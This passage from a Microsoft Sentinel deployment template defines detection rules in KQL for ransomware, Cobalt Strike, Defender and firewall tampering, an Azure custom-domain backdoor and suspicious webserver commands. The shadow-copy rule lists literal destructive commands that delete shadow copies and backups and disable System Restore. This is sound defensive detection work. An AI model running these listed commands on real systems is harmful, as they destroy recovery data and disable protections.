strcat(Type, \": \", Source)\n| project Type, TimeGenerated, Computer, User, Process, ParentImage, CommandLine\n| extend timestamp = TimeGenerated, AccountEntity = User, HostEntity = Computer\n)\n)\n| extend HostName = tostring(split(HostEntity, \".\")[0]), DomainIndex = toint(indexof(HostEntity, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(HostEntity, DomainIndex + 1), HostEntity)\n| extend AccountName = tostring(split(AccountEntity, @'\\')[1]), AccountDomain = tostring(split(AccountEntity, @'\\')[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1068",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2f561e20-d97b-4b13-b02d-18b34af6e87c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountDomain"
                },
                {
                  "identifier": "FullName",
                  "columnName": "AccountEntity"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostEntity"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/dccf6ebc-f45f-4dc1-9fb1-57c852531fc8')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/dccf6ebc-f45f-4dc1-9fb1-57c852531fc8')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Shadow Copy Deletions",
          "description": "This rule detects when Shadow Copies are being deleted. This is a know actions that is performed by threat actors.\nThis query detects know commands that have been used by the ransomware actors.\nSome information from Mitre Attack: \nhttps://attack.mitre.org/techniques/T1490/",
          "severity": "Medium",
          "enabled": true,
          "query": "let CommonRansomwareExecutionCommands = dynamic([@'vssadmin.exe delete shadows /all /quiet', \n@'wmic.exe shadowcopy delete', @'wbadmin delete catalog -quiet', \n@'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}',\n@'del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk', \n@'wbadmin delete systemstatebackup -keepVersions:0', \n@'schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable', \n@'schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /enable >nul 2>&1', \n@'reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f', \n@'reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f', \n@'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f', \n@'reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f', \n@'reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1', \n@'reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1', \n@'reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /f >nul 2>&1', \n@'reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /f >nul 2>&1']);\nDeviceProcessEvents\n| where ProcessCommandLine has_any (CommonRansomwareExecutionCommands)\n| project-reorder TimeGenerated, ProcessCommandLine, DeviceName, AccountName\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1490"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "28c63a44-2d35-48b7-831b-3ed24af17c7e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountUpn"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "AccountDomain"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "ProcessId",
                  "columnName": "ProcessId"
                },
                {
                  "identifier": "CommandLine",
                  "columnName": "ProcessCommandLine"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e00a00ea-2313-4050-a7f5-b73f9b443611')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e00a00ea-2313-4050-a7f5-b73f9b443611')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map IP Entity to AzureActivity",
          "description": "This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in AzureActivity.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h; // Look back 1 hour for AzureActivity logs\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  // Filter out indicators without relevant IP address fields\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  // Select the IP entity based on availability of different IP fields\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  // Exclude local addresses using the ipv4_is_private operator and filtering out specific address prefixes\n  | where ipv4_is_private(TI_ipEntity) == false and  TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and AzureActivity logs to identify potential malicious activity\nIP_Indicators\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n    AzureActivity | where TimeGenerated >= ago(dt_lookBack)\n    // renaming time column so it is clear the log this came from\n    | extend AzureActivity_TimeGenerated = TimeGenerated\n)\non $left.TI_ipEntity == $right.CallerIpAddress\n| where AzureActivity_TimeGenerated < ExpirationDateTime\n| summarize AzureActivity_TimeGenerated = arg_max(AzureActivity_TimeGenerated, *) by IndicatorId, CallerIpAddress\n| project AzureActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, TI_ipEntity, CallerIpAddress, \nCaller, OperationNameValue, ActivityStatusValue, CategoryValue, ResourceId, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n| extend timestamp = AzureActivity_TimeGenerated\n| extend Name = iif(Caller has '@', tostring(split(Caller,'@',0)[0]), \"\")\n| extend UPNSuffix = iif(Caller has '@', tostring(split(Caller,'@',1)[0]), \"\")\n| extend AadUserId = iif(Caller !has '@', tostring(Caller), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2441bce9-02e4-407b-8cc7-7d597f38b8b0",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "AadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "AzureResource",
              "fieldMappings": [
                {
                  "identifier": "ResourceId",
                  "columnName": "ResourceId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3f914eb7-5b7c-4ec5-9a5c-1b961168d583')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3f914eb7-5b7c-4ec5-9a5c-1b961168d583')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Potential Ransomware activity related to Cobalt Strike",
          "description": "This query searches for alerts related to suspected ransomware and Cobalt Strike activity, a tool used in numerous ransomware campaigns. It looks for alerts that indicate potential ransomware activity, such as attempts to clear security event logs, delete backup files, and execute Cobalt Strike malware.",
          "severity": "High",
          "enabled": true,
          "query": "// Look for sc.exe disabling services\nAlertInfo \n// Attempts to clear security event logs. \n| where Title in(\"Event log was cleared\", \n// List alerts flagging attempts to delete backup files. \n\"File backups were deleted\", \n// Potential Cobalt Strike activity - Note that other threat activity can also \n// trigger alerts for suspicious decoded content \n\"Suspicious decoded content\", \n// Cobalt Strike activity \n\"\\'Atosev\\' malware was detected\", \n\"\\'Ploty\\' malware was detected\", \n\"\\'Bynoco\\' malware was detected\",\n\"\\'Cobaltstrike\\' malware was detected\",\n\"Echo command over pipe on localhost\",\n\"Known attack framework activity was observed\",\n\"An active \\'Cobaltstrike\\' malware was detected\",\n\"Suspicious \\'CobaltStrike\\' behavior was prevented\",\n\"Suspicious process launch by Rundll32.exe\") \n| extend AlertTime = TimeGenerated | distinct AlertTime, AlertId, Title \n| join AlertEvidence on $left.AlertId == $right.AlertId\n| summarize by DeviceId, AlertTime, Title, AlertId\n// Get device IDs\n| join DeviceLogonEvents on $left.DeviceId == $right.DeviceId \n// Creating 10 day Window surrounding alert activity \n| where TimeGenerated < AlertTime + 12h and TimeGenerated > AlertTime - 12h // Projecting specific columns \n| project Title, DeviceName, DeviceId, TimeGenerated, LogonType, AccountDomain, AccountName, AccountSid, AlertTime, AlertId, RemoteIP, RemoteDeviceName\n| extend AccountFullName = tostring(strcat(AccountDomain, \"\\\\\", AccountName))\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "DefenseEvasion",
            "Impact"
          ],
          "techniques": [
            "T1059",
            "T1078",
            "T1070",
            "T1490"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4bd9ce9d-8586-4beb-8fdb-bd018cacbe7d",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountFullName"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "AccountDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "RemoteIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a78ca025-ea2d-4342-a404-2fa076a8ea12')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a78ca025-ea2d-4342-a404-2fa076a8ea12')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Imminent Ransomware",
          "description": "This query checks for a series of commands that are commonly used by attackers to disable security tools and system recovery tools before deploying Macaw ransomware in an organization.",
          "severity": "High",
          "enabled": true,
          "query": "_ASim_ProcessEvent \n// Pivot on specific commands \n| where CommandLine has_any(\"-ExclusionPath\", \"Set-MpPreference\", \"advfirewall\", \"-ExclusionExtension\", \n\"-EnableControlledFolderAccess\", \"windefend\", \"onstart\", \"bcdedit\", \"Startup\") \n// Making list of found commands \n| summarize CommandLine = make_set(CommandLine, 10000) by DvcId, Dvc, bin(TimeGenerated, 6h) \n// Extending columns for later aggregration, based on TTP\n| extend StartUpExclusionPath = iff(CommandLine has_all(\"-ExclusionPath\", \"Startup\"), 1, 0) \n| extend DefenderTamp = iff(CommandLine has \"Set-MpPreference\" \nand CommandLine has_any( \n\"-SevereThreatDefaultAction 6\" \n\"-HighThreatDefaultAction 6\", \n\"-ModerateThreatDefaultAction 6\", \n\"-LowThreatDefaultAction 6\" \n\"-ScanScheduleDay 8\"), 1, 0) \n| extend NetshFirewallTampering = iff(CommandLine has_all( \"netsh\", \"advfirewall\", \"allprofiles state off\"), 1, 0) \n| extend BatExclusion = iff(CommandLine has_all(\"-ExclusionExtension\", \".bat\"), 1, 0) \n| extend ExeExclusion = iff(CommandLine has_all(\"-ExclusionExtension\", \".exe\"), 1, 0) \n| extend DisableControlledFolderAccess = iff(CommandLine has_all(\"-EnableControlledFolderAccess\", \"Disabled\"), 1, 0) \n| extend ScDeleteDefend = iff(CommandLine has_all(\"sc\", \"delete\", \"windefend\"), 1, 0) \n| extend BootTampering = iff(CommandLine has_all(\"bcdedit\", \"default\") and CommandLine has_any (\"recoveryenabled No\", \"bootstatuspolicy ignoreallfailures\"), 1, 0) \n| extend SchTasks = iff(CommandLine has_all(\"/sc\", \"onstart\", \"system\", \"/create\", \"/delay\"), 1, 0) \n// Summarizing found commands \n| summarize by NetshFirewallTampering ,BatExclusion, ExeExclusion, DisableControlledFolderAccess, ScDeleteDefend, SchTasks, BootTampering, DefenderTamp, StartUpExclusionPath, DvcId, Dvc, TimeGenerated \n// Adding up each piece of evidence \n| extend EvidenceCount = NetshFirewallTampering + BatExclusion + ExeExclusion + DisableControlledFolderAccess + ScDeleteDefend + SchTasks + BootTampering + DefenderTamp + StartUpExclusionPath \n| where EvidenceCount > 4\n| extend HostName = iff(Dvc has '.', substring(Dvc, 0, indexof(Dvc, '.')), Dvc)\n| extend DnsDomain = iff(Dvc has '.', substring(Dvc, indexof(Dvc, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence"
          ],
          "techniques": [
            "T1562",
            "T1547"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "bb46dd86-e642-48a4-975c-44f5ac2b5033",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Dvc"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/dfa6dd0e-3852-4dda-bd10-cd8c4b1b367a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/dfa6dd0e-3852-4dda-bd10-cd8c4b1b367a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Possible SignIn from Azure Backdoor",
          "description": "Identifies when a user adds an unverified domain as an authentication method, followed by a sign-in from a user the newly added domain. Threat actors may add custom domains to create a backdoor to your tenant. It's important to monitor whenever custom domains are added to the tenant.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Microsoft Entra ID  Backdoors: Identity Federation\n//Ref: https://www.inversecos.com/2021/11/how-to-detect-azure-active-directory.html\nAuditLogs\n| where OperationName == \"Add unverified domain\"\n| where Result == \"success\"\n| extend InitiatedBy = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| extend DomainName = tostring(TargetResources[0].displayName)\n| summarize DomainAddedTime = min(TimeGenerated), ModifiedProperties = make_set(parse_json(TargetResources[0].modifiedProperties),1048576) by InitiatedBy, DomainName\n| join kind=inner (\nSigninLogs\n| where ResultType == \"0\"\n| extend UserDomain = tostring(parse_json(split(UserPrincipalName,\"@\",1)[0]))\n| summarize SignInTime = min(TimeGenerated)  by UserPrincipalName, IPAddress, tostring(LocationDetails),AppDisplayName,ResourceDisplayName,UserDomain\n) on $left.DomainName == $right.UserDomain\n// Getting UserName and Domain\n| extend Name = split(UserPrincipalName,\"@\",0), Domain = split(UserPrincipalName,\"@\",1)\n| mv-expand Name,Domain\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "fa00014c-c5f4-4715-8f5b-ba567e19e41e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "InitiatedBy": "InitiatedBy",
            "ModifiedProperties": "ModifiedProperties",
            "AppDisplayName": "AppDisplayName",
            "SignInTime": "SignInTime",
            "DomainAdded": "DomainName",
            "DomainAddedTime": "DomainAddedTime",
            "ResourceDisplayName": "ResourceDisplayName"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "NTDomain",
                  "columnName": "UserDomain"
                },
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/64010adb-79b5-40b7-871e-91afecc876f3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/64010adb-79b5-40b7-871e-91afecc876f3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map IP entity to Azure Key Vault logs",
          "description": "Identifies a match in Azure Key Vault logs from any IP IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h; // Look back 1 hour for AzureDiagnostics logs\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  | where ipv4_is_private(TI_ipEntity) == false and  TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and AzureDiagnostics logs for Key Vault events\nIP_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n      AzureDiagnostics\n      | where ResourceType =~ \"VAULTS\"\n      | where TimeGenerated >= ago(dt_lookBack)\n      | extend KeyVaultEvents_TimeGenerated = TimeGenerated, ClientIP = CallerIPAddress\n  )\n  on $left.TI_ipEntity == $right.ClientIP\n  // Filter out logs that occurred after the expiration of the corresponding indicator\n  | where KeyVaultEvents_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and ClientIP, and keep the log entry with the latest timestamp\n  | summarize KeyVaultEvents_TimeGenerated = arg_max(KeyVaultEvents_TimeGenerated, *) by IndicatorId, ClientIP\n  // Select the desired output fields\n  | project KeyVaultEvents_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\n    TI_ipEntity, ClientIP, ResourceId, SubscriptionId, OperationName, ResultType, CorrelationId, id_s, clientInfo_s, httpStatusCode_d,\n    identity_claim_appid_g, identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, Type\n  // Rename the timestamp field\n  | extend timestamp = KeyVaultEvents_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "57c7e832-64eb-411f-8928-4133f01f4a25",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            },
            {
              "entityType": "AzureResource",
              "fieldMappings": [
                {
                  "identifier": "ResourceId",
                  "columnName": "ResourceId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.3.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ead39683-ca57-4d77-b8b6-5510f2420dc9')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ead39683-ca57-4d77-b8b6-5510f2420dc9')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect Suspicious Commands Initiated by Webserver Processes",
          "description": "This query was originally published in the threat analytics report, Operation Soft Cell.\nOperation Soft Cell is a series of campaigns targeting users' call logs at telecommunications providers throughout the world. These attacks date from as early as 2012.\nOperation Soft Cell operators sometimes use legitimate web server processes to launch commands, especially for network discovery and user/owner discovery. The following query detects activity of this kind.\nReference - https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers",
          "severity": "High",
          "enabled": true,
          "query": "// Suspicious commands launched by web server processes\nDeviceProcessEvents \n| where (((InitiatingProcessParentFileName in(\"w3wp.exe\", \"beasvc.exe\",\n    \"httpd.exe\") or InitiatingProcessParentFileName startswith \"tomcat\")\n    or InitiatingProcessFileName in(\"w3wp.exe\", \"beasvc.exe\", \"httpd.exe\") or\n    InitiatingProcessFileName startswith \"tomcat\"))\n    and FileName in~('cmd.exe', 'powershell.exe')\n| where ProcessCommandLine contains '%temp%'\n    or ProcessCommandLine has 'wget'\n    or ProcessCommandLine has 'whoami'\n    or ProcessCommandLine has 'certutil'\n    or ProcessCommandLine has 'systeminfo'\n    or ProcessCommandLine has 'ping'\n    or ProcessCommandLine has 'ipconfig'\n    or ProcessCommandLine has 'timeout'\n| summarize\n    take_any(FileName),\n    make_set(ProcessCommandLine, 100000),\n    take_any(InitiatingProcessFileName),\n    take_any(InitiatingProcessParentFileName)\n    by DeviceId, DeviceName\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "DefenseEvasion",
            "Discovery"
          ],
          "techniques": [
